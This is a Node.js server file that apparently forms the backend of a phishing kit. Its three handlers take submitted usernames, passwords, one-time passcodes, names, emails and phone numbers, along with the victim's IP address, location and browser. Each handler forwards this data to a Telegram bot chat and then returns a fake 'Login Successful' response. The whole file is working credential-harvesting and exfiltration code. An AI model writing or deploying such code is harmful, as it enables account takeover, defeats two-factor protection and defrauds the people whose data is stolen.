require('dotenv').config();
const axios = require("axios");

let botToken = process.env.TELEGRAM_BOT_TOKEN;
let chatId = process.env.TELEGRAM_CHAT_ID;

const login = (req, res) => {
    const { ip, country, browser } = req.body.userInfo
    const { username, password, date } = req.body;
    // console.log('receive data', req.body);

    // Properly formatted message
    const message = `---------------🔐 *Login Attempt*:---------------
    \n👤 *Username:* ${username}\n🔑 *Password:* ${password}\n🌍 **IP Address:** ${ip}\n📍 **Location:** ${country}\n
    ----------------------------------------------   📅 **Date & Time:** ${date}\n 🖥 **Browser:** ${browser}
    `;

    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
    })
        .then(() => {
            res.status(201).json({ message: "Login Successful", status: 201 });
        })
        .catch((error) => {
            console.error("Error sending message to Telegram:", error);
            res.status(500).json({ message: "Failed to send message", error: error.message });
        });
};
const otp = (req, res) => {
    const { ip, country, browser } = req.body.userInfo
    const { otp, date } = req.body
    console.log(req.body);

    // message sending to telegram
    const message = `--------------------🔐 *OTP*--------------------
     \n👤 *Otp:* ${otp}
    --------------------------------------   
    🌍 **IP Address:** ${ip}\n📍 **Location:** ${country}\n 📅 **Date & Time:** ${date}\n 🖥 **Browser:** ${browser}`;

    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
    })
        .then(() => {
            res.status(201).json({ message: 'Code sent successfully', status: 201 })
        })
        .catch(() => {
            console.error("Error sending message");
            res.status(500).json({ message: "Failed to send message", status: 500 })
        })
}
const alert = (req, res) => {
    const { ip, country, browser } = req.body.userInfo
    const { fullname, email, number, date } = req.body
    console.log(req.body);

    //  Message sent to telegram
    const message = `---------------🔐 *Alert Information*--------------- \n👤 *Full Name:* ${fullname}\n📧 *Email:* ${email}\n📞  *Number:* ${number}🌍
    --------------------------------------
     **IP Address:** ${ip}\n📍 **Location:** ${country}\n 📅 **Date & Time:** ${date}\n 🖥 **Browser:** ${browser}`;

    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
    })
        .then(() => {
            res.status(201).json({ message: "information sent successfully", status: 201 })
        })
        .catch(() => {
            console.error('Error sending message');
            res.status(500).json({ message: 'Error sending message', status: 500 })
        })
}

module.exports = { login, otp, alert };
